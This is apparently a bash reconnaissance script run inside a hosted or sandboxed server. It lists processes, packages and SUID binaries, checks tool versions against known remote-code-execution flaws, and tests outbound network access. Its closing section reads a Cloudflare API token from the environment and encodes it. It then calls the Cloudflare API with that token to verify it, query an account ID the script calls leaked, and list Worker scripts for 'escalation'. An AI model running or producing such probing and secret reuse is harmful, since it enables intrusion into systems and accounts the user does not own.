#!/bin/bash
echo "writing to a file"
echo "--- NESTED PROCESS MONITORING ---"
# 1. Capture the 'Before' state
ps aux --sort=-start_time > before.txt
# 2. Trigger the "Trap" 
echo "We use multiple extensions to see what the server likes to sniff"
touch exploit.patch
touch document.pdf
touch archive.tar.gz

echo " Wait for the 'Watcher' "
sleep 5
echo "--- NEW PROCESSES DETECTED ---"
ps aux --sort=-start_time > after.txt
diff before.txt after.txt | grep ">"
echo "--- EGACY SOFTWARE INSPECTION ---"
# 1. Check for 'patch' or 'git apply' binaries
which patch || echo "patch not found"
which git || echo "git not found"

# 2. Look for background processes that might be 'watching' the directory
ps aux | grep -v "grep"

# 3. Check for specific Perl modules that handle diffs/patches (Found in your dpkg list!)
perl -MAlgorithm::Diff -e 'print "Algorithm::Diff installed\n"' 2>/dev/null
echo " Check Ghostscript for known 2025 sandbox escapes "
# Check if we can "ping" an external IP or if it's firewalled
curl -I http://google.com || echo "Outbound blocked"
gs --version
sqlite3 --version
find /usr/bin /usr/sbin -perm -4000 -type f 2>/dev/null
echo "--- THE MASTER LIST ---"
# 1. Ask the Debian/Ubuntu package manager for EVERYTHING
dpkg -l
# 2. Ask the Python manager for all libraries (looking for Docling/others)
pip list
# 3. Ask the Node.js manager (if npm is there)
npm list -g --depth=0
# 4. Look at all "Running" services (to see if a DB is actually active)
ps aux
# 3. Check for other 'Legacy' favorites
echo "--- OTHER TOOL VERSIONS ---"
git --version || echo "Git not found"
python --version || echo "Python not found"
curl --version | head -n 1 || echo "Curl not found"
sqlite3 --version || echo "SQLite not found"
echo "---SCANNING FOR VULNERABLE BINARIES ---"
# 1. ImageMagick (Legendary for RCEs like ImageTragick)
convert -version | head -n 1 || echo "ImageMagick not found"
# 2. Git (Check for CVE-2024-32002 or newer - RCE via submodules)
git --version
# 3. OpenSSL (Heartbleed style or newer buffer overflows)
openssl version
# 4. Tar/Unzip (Check for 'Zip Slip' path traversal vulnerabilities)
tar --version | head -n 1
unzip -v | head -n 1
# 5. FFmpeg (Video processing often has memory corruption bugs)
ffmpeg -version | head -n 1 || echo "FFmpeg not found"
# 6. LibXML2 (Potential for XXE - XML External Entity attacks)
xmllint --version
which gcc && gcc --version
which g++ && g++ --version
which make && make --versionecho "--- 🕵️ DEEP SYSTEM AUDIT ---"
gm version | head -n 2 || echo "No GraphicsMagick"
samba -V 2>/dev/null || smbd -V 2>/dev/null || echo "No Samba"
perl -v | head -n 2
echo "Searching for vulnerable Perl CryptX..."
perl -MCryptX -e 'print $CryptX::VERSION' 2>/dev/null || echo "CryptX not found"
perl -MCryptX -e 'print "CryptX Version: " . $CryptX::VERSION . "\n"' || echo "CryptX not installed"
# Check for the 2025 Tarfile Trap (Python 3.12+)
python3 -c "import tarfile; print('Tarfile filter exists' if hasattr(tarfile, 'data_filter') else 'Old Tarfile')"
perl -V | grep "archlib" # Check where Perl stores its 'XS' extensions
find /usr/lib/perl -name "*.so" # Find the actual compiled C-code files

echo "--- DATABASE INTERFACE AUDIT ---"
# 1. SQLite (Commonly embedded, often neglected)
sqlite3 --version || echo "No SQLite3"
# 2. PostgreSQL Client (Check for libpq version)
psql --version || echo "No Postgres Client"
# 3. MySQL/MariaDB (Look for old versions of libmysqlclient)
mysql --version || echo "No MySQL Client"
# 4. Redis (Check for unauthenticated local instances)
redis-cli --version && redis-cli ping || echo "No local Redis"
# 5. The 2026 "Docling" RCE (Python-based DB parsing)
pip show docling | grep Version || echo "Docling not found"
echo "--- QUICK RECON ---"

echo $CLOUDFLARE_API_TOKEN | base64
curl -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" -H "Authorization: Bearer <DECODED_TOKEN>"
echo "--- TEST 1: Standard Bearer Format ---"
curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" \
     -H "Authorization: Bearer $DECODED_TOKEN" \
     -H "Content-Type: application/json"

echo "--- TEST 2: Account-Level Verification ---"
# Using the Account ID leaked in your previous logs
curl -s -X GET "https://api.cloudflare.com/client/v4/accounts/3514ad102b78d8da0986b1def65b00b6/tokens/verify" \
     -H "Authorization: Bearer $DECODED_TOKEN"

echo "--- Checking Worker Scripts (Potential Escalation) ---"
curl -s -X GET "https://api.cloudflare.com/client/v4/accounts/3514ad102b78d8da0986b1def65b00b6/workers/scripts" \
     -H "Authorization: Bearer $DECODED_TOKEN"
echo "--- FINISHED ---"
